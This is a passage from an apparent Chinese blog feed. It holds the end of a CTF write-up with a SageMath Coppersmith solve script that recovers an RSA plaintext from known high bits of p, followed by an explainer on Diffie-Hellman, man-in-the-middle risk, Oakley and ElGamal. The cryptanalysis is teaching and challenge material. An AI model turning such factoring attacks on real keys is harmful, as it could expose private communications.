data-num="10"></td><td><pre>    <span class="token keyword">assert</span> n <span class="token operator">==</span> P<span class="token operator">*</span>Q</pre></td></tr><tr><td data-num="11"></td><td><pre>    </pre></td></tr><tr><td data-num="12"></td><td><pre>    d <span class="token operator">=</span> inverse_mod<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>P<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>Q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>power_mod<span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    </pre></td></tr><tr><td data-num="15"></td><td><pre>n <span class="token operator">=</span> <span class="token number">65941249956454045900925748110344885155578849459761886289551541848033080705473468411505136530336561460230704780102762179334949928987017294170942951738408512582341934721650026103527287094659147263380069441023677649037769806095851547697740578588236302465290071838541989837695241059034636247243505104997008048433</span></pre></td></tr><tr><td data-num="16"></td><td><pre>c <span class="token operator">=</span> <span class="token number">627824086157119245056478875800598959553774250161670787506083253960788230737588761787385686125828765665617567887904228030839535317987589608761534500003128247164233774794784231518212804270056404565710426613938264302998015421153393879729263551292024543756422702956470022959537221269172084619081368498693930550456153543628170306324206266216348386707008661128717431426237486511309767286175518238620230507201952867261283880986868752676549613958785288914989429224582849218395471672295410036858881836363364885164276983237312235831591858044908369376855484127614933545955544787160352042318378588039587911741028067576722790778</span></pre></td></tr><tr><td data-num="17"></td><td><pre>p_high <span class="token operator">=</span> <span class="token number">97522826022187678545924975588711975512906538181361325096919121233043973599759518562689050415761485716705615149641768982838255403594331293651224395590747133152128042950062103156564440155088882592644046069208405360324372057140890317518802130081198060093576841538008960560391380395697098964411821716664506908672</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>phase<span class="token punctuation">(</span>p_high<span class="token punctuation">,</span> n<span class="token punctuation">,</span> c<span class="token punctuation">)</span></pre></td></tr></table></figure><hr />
<p>参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvY3J5cHRvL2FzeW1tZXRyaWMvcnNhL3JzYV9jb3BwZXJzbWl0aF9hdHRhY2sv">https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21pbW9vL1JTQS1hbmQtTExMLWF0dGFja3M=">https://github.com/mimoo/RSA-and-LLL-attacks</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kOGQyY2U1MzA0MWI=">https://www.jianshu.com/p/d8d2ce53041b</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxOTk5NzcyL2FydGljbGUvZGV0YWlscy8xMjM2MjA5MzI=">https://blog.csdn.net/qq_51999772/article/details/123620932</span></p>
]]></content>
      <categories>
        <category>Write-up</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈Diffie-Hellman</title>
    <url>/crypto/write/DH/</url>
    <content><![CDATA[<p>公共密钥加密，又称非对称加密，是一种密码学算法类型，这种算法需要两个密钥，一个是私人密钥，另一个则是公开密钥。我们将公钥公之于众进行加密，而保存私钥用于解密。这种算法的优点是不需要经过安全渠道传递密钥，简化了密钥管理过程</p>
<p><a id="more"></a></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/30/bd23ba6fe9521d1b.jpeg" alt="" /></p>
<p>1976 年，Whitfield Diffie 和 Martin Hellman 发表的论文 <em>New directions in cryptography</em> 展示了一种算法，表明非对称加密或是公共密钥加密是可行的；整个学界哗然，划时代的密码体制就此诞生了。现代密码学的溯源其实反反复复也最终还是追随到 Diffie and Hellman 这两位人身上。可以说，称 Diffie-Hellman 密钥交换算法为密码学史上的革命也丝毫不为过。新生的现代密码学，为我们个人通信、商业机密的传送提供了强有力的保障。比如 Https 协议的 TSL (Transport Layer Security) 以 DH 算法作为密钥交换算法。</p>
<h2 id="diffie-hellman算法原理"><a class="anchor" href="#diffie-hellman算法原理">#</a> Diffie-Hellman 算法原理</h2>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/30/9db77789bd24ad55.jpg" alt="" /></p>
<p>手上保存私钥，公开公钥；在离散对数中，由 K 求出 k 很难，通过公钥解出私钥几乎是不可行的。也就是说算法的安全性是基于离散对数的复杂度</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>K</mi><mo>=</mo><msubsup><mi>k</mi><mi>b</mi><mi>a</mi></msubsup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>b</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mi>a</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><msup><mi>g</mi><mrow><mi>b</mi><mi>a</mi></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><msup><mi>g</mi><mi>a</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><msup><mo stretchy="false">)</mo><mi>b</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><msubsup><mi>k</mi><mi>a</mi><mi>b</mi></msubsup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mo>=</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">K=k_b^amodn=(g^bmodn)^amodn=g^{ba}modn=(g^amodn)^bmodn=k_a^bmodn=K
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9613919999999999em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-2.4530000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.146108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999998em;"><span style="top:-2.4530000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span></p>
<p>通过下面这张图或许能更直白地理解数学概述的抽象原理：</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/30/2d47f8b35e976955.jpg" alt="" /></p>
<p>该算法的唯一目的是为了让用户能够安全交换密钥得到一个共享的会话密钥，算法本身不具备加密解密的功能。</p>
<p>由于 DH 在传输 n，g 时并无身份验证，如果攻击者可以在信道的中央窜改两边收发的消息，就可以假扮身份完成两次 Diffie-Hellman 密钥交换。这样攻击者就可以解密全部的信息。所以在替换双方传输时的数据有机会被实施<strong>中间人攻击</strong></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/30/0c6cd610dfddb9a4.png" alt="" /></p>
<p>应运而生的是 Oakley 算法 —— 对 Diffie-Hellman 密钥交换算法的优化，它保留了后者的优点，同时克服了其弱点。</p>
<p>Oakley 算法具有五个重要特征：</p>
<ol>
<li>
<p>它采用称为 cookie 程序的机制来对抗阻塞攻击。</p>
</li>
<li>
<p>它使得双方能够协商一个全局参数集合。</p>
</li>
<li>
<p>它使用了现时来保证抵抗重演攻击。</p>
</li>
<li>
<p>它能够交换 Diffie-Hellman 公开密钥。</p>
</li>
<li>
<p>它对 Diffie-Hellman 交换进行鉴别以对抗中间人的攻击。</p>
</li>
</ol>
<p>Oakley 可以使用三个不同的鉴别方法：</p>
<ol>
<li>
<p>数字签名：通过签署一个相互可以获得的散列代码来对交换进行鉴别；每一方都使用自己的私钥对散列代码加密。散列代码是在一些重要参数上生成的，如用户 ID 和现时。</p>
</li>
<li>
<p>公开密钥加密：通过使用发送者的私钥对诸如 ID 和现时等参数进行加密来鉴别交换。</p>
</li>
<li>
<p>对称密钥加密：通过使用某种共享密钥对交换参数进行对称加密，实现交换的鉴别。</p>
</li>
</ol>
<h2 id="与rsa的区别"><a class="anchor" href="#与rsa的区别">#</a> 与 RSA 的区别</h2>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/30/d2732b224ccdd82f.png" alt="" /></p>
<p>每次会话时都产生随机的（a,b）值，未来的密钥泄漏并不会破解之前的会话密钥。这也说明了迪菲 - 赫尔曼密钥交换是支持前向保密的</p>
<h2 id="elgamal-公钥加密算法"><a class="anchor" href="#elgamal-公钥加密算法">#</a> Elgamal 公钥加密算法</h2>
<p>基于迪菲 - 赫尔曼密钥交换演化出来的 ElGamal 加密算法，可以用来加密 / 解密消息，但是由于一些历史原因以及 RSA 公钥加密算法的巨大商业成功，ElGamal 加密算法并不流行。</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi><mtext>选取一对</mtext><mo stretchy="false">(</mo><mi>g</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>a</mi><mtext>作为【私钥】，然后计算出</mtext><mi>A</mi><mo>=</mo><msup><mi>g</mi><mi>a</mi></msup><mtext>作为【公钥】。</mtext><mspace linebreak="newline"></mspace><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi><mtext>将</mtext><mo stretchy="false">(</mo><mi>g</mi><mo separator="true">,</mo><mi>p</mi><mo separator="true">,</mo><mi>A</mi><mo stretchy="false">)</mo><mtext>公布给所有人。</mtext><mspace linebreak="newline"></mspace><mi>B</mi><mi>o</mi><mi>b</mi><mtext>现在想给</mtext><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi><mtext>传送一条信息</mtext><mi>m</mi><mi mathvariant="normal">.</mi><mtext>于是</mtext><mi>B</mi><mi>o</mi><mi>b</mi><mtext>选取一个随机数</mtext><mi>k</mi><mo separator="true">,</mo><mtext>计算出</mtext><msub><mi>c</mi><mn>1</mn></msub><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mo separator="true">,</mo><mspace width="1em"/><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><msup><mi>A</mi><mi>k</mi></msup><mspace width="1em"/><mspace linebreak="newline"></mspace><mi>S</mi><mi>E</mi><mi>N</mi><mi>D</mi><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi><mo stretchy="false">(</mo><msub><mi>c</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>c</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Alice 选取一对 (g,p), a作为【私钥】，然后计算出 A=g^a 作为【公钥】。\\
Alice 将 (g,p,A)公布给所有人。\\Bob 现在想给 Alice 传送一条信息 m. 于是 Bob 选取一个随机数 k, 计算出c_1=g^k, \quad c_2=mA^k \quad \\SEND Alice(c_1,c_2)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">对</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">【</span><span class="mord cjk_fallback">私</span><span class="mord cjk_fallback">钥</span><span class="mord cjk_fallback">】</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">出</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9088319999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">【</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">钥</span><span class="mord cjk_fallback">】</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">将</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">A</span><span class="mclose">)</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">布</span><span class="mord cjk_fallback">给</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">人</span><span class="mord cjk_fallback">。</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">给</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">送</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">条</span><span class="mord cjk_fallback">信</span><span class="mord cjk_fallback">息</span><span class="mord mathnormal">m</span><span class="mord">.</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">出</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>Alice's operation</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mi>a</mi><mi>l</mi><mi>c</mi><mi>u</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>e</mi><mspace width="1em"/><msubsup><mi>c</mi><mn>1</mn><mrow><mo>−</mo><mi>a</mi></mrow></msubsup><mo separator="true">⋅</mo><msub><mi>c</mi><mn>2</mn></msub><mo>=</mo><msup><mi>g</mi><mrow><mo>−</mo><mi>k</mi><mi>a</mi></mrow></msup><mo separator="true">⋅</mo><mi>m</mi><mo separator="true">⋅</mo><msup><mi>g</mi><mrow><mi>a</mi><mi>k</mi></mrow></msup><mo>=</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">calculate \quad c_1^{-a}·c_2=g^{-ka}·m·g^{ak}=m
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.07777em;vertical-align:-0.256439em;"></span><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">c</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">t</span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8213309999999999em;"><span style="top:-2.4435610000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.256439em;"><span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mord mathnormal mtight">a</span></span></span></span></span></span></span></span></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span></span></p>
<p>Alice 成功获取 m</p>
<p>Elgamal 的安全性与 DH 是一致的</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/30/3c54ca8aa5fdf178.png" alt="" /></p>
<p>产生密钥</p>
